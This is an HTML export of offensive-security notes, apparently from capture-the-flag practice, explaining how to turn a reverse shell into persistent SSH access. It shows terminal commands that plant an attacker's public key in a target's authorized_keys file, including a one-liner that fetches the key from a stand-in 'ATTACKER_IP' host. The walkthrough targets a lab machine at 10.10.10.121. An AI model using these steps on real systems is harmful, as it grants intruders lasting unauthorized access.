<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Upgrade to SSH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Upgrade to SSH</h1></strong><br />Is ssh running on the target machine? <br />Tired of your crappy php reverse shell? <br />Upgrade to an SSH shell for improved reliability and functionality!<br /><br /><strong>Summary</strong><br />Skip to step 4 if you already have your own SSH key.<br /><br />1. Generate ssh key pair - <code>ssh-keygen -t rsa -b 4096</code><strong><br /></strong>2. Start ssh service - <code>service ssh start</code><br />3. Copy your public key to a working directory - <code>mkdir serve; cd serve; cp /root/.ssh/id_rsa.pub .</code><br />4. Start a python web server - <code>python -m SimpleHTTPServer</code><br />5. Retrieve your public key and echo it into authorized_keys file - <code>echo $(wget http://ATTACKER_IP:8000/.ssh/id_rsa.pub) &gt;&gt; /root/.ssh/authorized_keys</code><br /><br /><strong>Crafty one-liner</strong><br />Attacker: <code>python -m SimpleHTTPServer</code><br />Target: <code>echo $(wget http://ATTACKER_IP:8000/.ssh/id_rsa.pub) &gt;&gt; ~/.ssh/authorized_keys</code><br /><br /><strong><h2>## How-to</h2></strong><br /><strong><h3>### 1. Generate ssh key pair</h3></strong><br />If you don&#39;t have an SSH key pair already, generate one.<br /><div class="codebox"><div class="codebox">root@kali:~#&nbsp;ssh-keygen&nbsp;-t&nbsp;rsa&nbsp;-b&nbsp;4096<br />Generating&nbsp;public/private&nbsp;rsa&nbsp;key&nbsp;pair.<br />Enter&nbsp;file&nbsp;in&nbsp;which&nbsp;to&nbsp;save&nbsp;the&nbsp;key&nbsp;(/root/.ssh/id_rsa):&nbsp;<br />Enter&nbsp;passphrase&nbsp;(empty&nbsp;for&nbsp;no&nbsp;passphrase):&nbsp;<br />Enter&nbsp;same&nbsp;passphrase&nbsp;again:&nbsp;<br />Your&nbsp;identification&nbsp;has&nbsp;been&nbsp;saved&nbsp;in&nbsp;/root/.ssh/id_rsa.<br />Your&nbsp;public&nbsp;key&nbsp;has&nbsp;been&nbsp;saved&nbsp;in&nbsp;/root/.ssh/id_rsa.pub.<br />The&nbsp;key&nbsp;fingerprint&nbsp;is:<br />SHA256:C4J3JBqH+VxROjOASyX0MX0UHyJLl/lk+w6Wez+NXOY&nbsp;root@kali<br />The&nbsp;keys&nbsp;randomart&nbsp;image&nbsp;is:<br />+---[RSA&nbsp;4096]----+<br />|&nbsp;.oo=.+o*+.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />|&nbsp;&nbsp;o=&nbsp;=.*+oo.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />|&nbsp;.+.+&nbsp;O.&nbsp;+..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />|&nbsp;&nbsp;.B&nbsp;+&nbsp;+&nbsp;&nbsp;o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />|&nbsp;&nbsp;o&nbsp;=&nbsp;o&nbsp;S&nbsp;&nbsp;o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />|&nbsp;&nbsp;&nbsp;.&nbsp;o&nbsp;.&nbsp;.+&nbsp;.&nbsp;&nbsp;&nbsp;o|<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..&nbsp;+&nbsp;.&nbsp;*&nbsp;|<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;o&nbsp;+&nbsp;E|<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;...&nbsp;|<br />+----[SHA256]-----+</div></div><br /><br /><strong><h3>### 2. Retrieve public key</h3></strong><br />Grab your public key from <code>~/.ssh/id_rsa.pub</code>.<br /><br /><div class="codebox"><div class="codebox">root@kali:~/.ssh#&nbsp;cat&nbsp;~/.ssh/id_rsa.pub<br />ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQDubnsite6+BZra+1yAChYHV4ar8P0vkke1IWlZLwGP85bThoKe+pICmD15nweBXA4Rp5UMfJLBzBtXMN+QhVXBvkzAzTHeOIFAxBY/VE6FSBOTGYs+Q77Hnwdt7gIqqmXmUTpOwM0bPxnJTAh6L7lP9D+k+PK060BwmAmiPRHLyKa0KTbIRilRQZB4G8Fb9DOAweXr+r8d0Bw7/rUD3tUfSO2qcyuh2D7yQbCrwj1orYcj9r1ApYdPAZtqDmKknMtVGFjUVBIoti9iVZ6DD75lfRHclyqChgKDt2d7D0nDfTED2PaaoEG6vmGfHp51cNA21Fdh71mR1gE5T9V2IoCFujN7Ls7WSHn+K+q0s4m2VMgMYe1GT9+dxKIkYrqIs72m5Qt2GA8CarPatG2ZQ109/KZc9p9so7lpTJlxbiQg58CkwpFIBP0uXj9CHMPnG7D5Cr3eaz8sU3egyflT4YaXx1PB2IdrACorukDtgDpxKWRVFduyf7qLhR9Yjsr358cgaBRh89V+RImmhVrioQOx9brl70NbNO/jgav7ACo8/P0wk2WzDGB6W05y+pagAAhu4zdsksXyB/VImOZ4Sx9dzJTyBUnjIWIbKDmS+m+H28Vkm2rzLYefSxPNMBtuMquvCuZV15mHMx97MDRF/qxeNiKUpFG2kX0FF7eYCI2BVw==&nbsp;root@kali</div></div><br /><br /><strong><h3>### 3. Start SSH service on your attacking machine</h3></strong><br /><div class="codebox"><div class="codebox">root@kali:~/.ssh#&nbsp;service&nbsp;ssh&nbsp;start<br />root@kali:~/.ssh#&nbsp;service&nbsp;ssh&nbsp;status<br />●&nbsp;ssh.service&nbsp;-&nbsp;OpenBSD&nbsp;Secure&nbsp;Shell&nbsp;server<br />&nbsp;&nbsp;&nbsp;Loaded:&nbsp;loaded&nbsp;(/lib/systemd/system/ssh.service;&nbsp;disabled;&nbsp;vendor&nbsp;preset:&nbsp;disabled)<br />&nbsp;&nbsp;&nbsp;Active:&nbsp;active&nbsp;(running)&nbsp;since&nbsp;Wed&nbsp;2019-05-15&nbsp;18:55:36&nbsp;BST;&nbsp;3s&nbsp;ago<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Docs:&nbsp;man:sshd(8)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;man:sshd_config(5)<br />&nbsp;&nbsp;Process:&nbsp;19010&nbsp;ExecStartPre=/usr/sbin/sshd&nbsp;-t&nbsp;(code=exited,&nbsp;status=0/SUCCESS)<br />&nbsp;Main&nbsp;PID:&nbsp;19011&nbsp;(sshd)<br />&nbsp;&nbsp;&nbsp;&nbsp;Tasks:&nbsp;1&nbsp;(limit:&nbsp;4915)<br />&nbsp;&nbsp;&nbsp;Memory:&nbsp;1.6M<br />&nbsp;&nbsp;&nbsp;CGroup:&nbsp;/system.slice/ssh.service<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└─19011&nbsp;/usr/sbin/sshd&nbsp;-D<br /><br />May&nbsp;15&nbsp;18:55:36&nbsp;kali&nbsp;systemd[1]:&nbsp;Starting&nbsp;OpenBSD&nbsp;Secure&nbsp;Shell&nbsp;server...<br />May&nbsp;15&nbsp;18:55:36&nbsp;kali&nbsp;sshd[19011]:&nbsp;Server&nbsp;listening&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;22.<br />May&nbsp;15&nbsp;18:55:36&nbsp;kali&nbsp;sshd[19011]:&nbsp;Server&nbsp;listening&nbsp;on&nbsp;::&nbsp;port&nbsp;22.<br />May&nbsp;15&nbsp;18:55:36&nbsp;kali&nbsp;systemd[1]:&nbsp;Started&nbsp;OpenBSD&nbsp;Secure&nbsp;Shell&nbsp;server.</div></div><br /><br /><strong><h3>### 4. Create .ssh folder on target &amp; add public key to authorized_keys</h3></strong><br />Create the <code>.ssh</code> directory on the target via your initial shell,<br /><code>echo</code> your ssh public key - the contents of <code>id_rsa.pub</code> - into an <code>authorized_keys</code> file in <code>/home/user/.ssh/authorized_keys</code> and set the file permissions.<br /><div class="codebox"><div class="codebox">$&nbsp;cd&nbsp;/home/help<br />$&nbsp;mkdir&nbsp;.ssh<br />$&nbsp;cd&nbsp;.ssh<br />$&nbsp;echo&nbsp;&quot;ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQDubnsite6+BZra+1yAChYHV4ar8P0vkke1IWlZLwGP85bThoKe+pICmD15nweBXA4Rp5UMfJLBzBtXMN+QhVXBvkzAzTHeOIFAxBY/VE6FSBOTGYs+Q77Hnwdt7gIqqmXmUTpOwM0bPxnJTAh6L7lP9D+k+PK060BwmAmiPRHLyKa0KTbIRilRQZB4G8Fb9DOAweXr+r8d0Bw7/rUD3tUfSO2qcyuh2D7yQbCrwj1orYcj9r1ApYdPAZtqDmKknMtVGFjUVBIoti9iVZ6DD75lfRHclyqChgKDt2d7D0nDfTED2PaaoEG6vmGfHp51cNA21Fdh71mR1gE5T9V2IoCFujN7Ls7WSHn+K+q0s4m2VMgMYe1GT9+dxKIkYrqIs72m5Qt2GA8CarPatG2ZQ109/KZc9p9so7lpTJlxbiQg58CkwpFIBP0uXj9CHMPnG7D5Cr3eaz8sU3egyflT4YaXx1PB2IdrACorukDtgDpxKWRVFduyf7qLhR9Yjsr358cgaBRh89V+RImmhVrioQOx9brl70NbNO/jgav7ACo8/P0wk2WzDGB6W05y+pagAAhu4zdsksXyB/VImOZ4Sx9dzJTyBUnjIWIbKDmS+m+H28Vkm2rzLYefSxPNMBtuMquvCuZV15mHMx97MDRF/qxeNiKUpFG2kX0FF7eYCI2BVw==&nbsp;root@kali&quot;&nbsp;&gt;&nbsp;authorized_keys<br />$&nbsp;chmod&nbsp;600&nbsp;authorized_keys<br />$&nbsp;cd&nbsp;..<br />$&nbsp;chmod&nbsp;700&nbsp;.ssh</div></div><br /><br /><strong><h3>### 5. SSH in using private key</h3></strong><br />SSH should now be set up and your public key in the target&#39;s <code>authorized_keys</code> file.<br />Now you can SSH into the target using your SSH private key to authenticate.<br /><div class="codebox"><div class="codebox">root@kali:~/.ssh#&nbsp;ssh&nbsp;-i&nbsp;~/.ssh/id_rsa&nbsp;help@10.10.10.121<br />Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.5&nbsp;LTS&nbsp;(GNU/Linux&nbsp;4.4.0-116-generic&nbsp;x86_64)<br /><br />&nbsp;*&nbsp;Documentation:&nbsp;&nbsp;https://help.ubuntu.com<br />&nbsp;*&nbsp;Management:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://landscape.canonical.com<br />&nbsp;*&nbsp;Support:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://ubuntu.com/advantage<br />You&nbsp;have&nbsp;new&nbsp;mail.<br />Last&nbsp;login:&nbsp;Fri&nbsp;Jan&nbsp;11&nbsp;06:18:50&nbsp;2019<br />help@help:~$&nbsp;<br /></div></div><br /><br /></div>
</body>
</html>
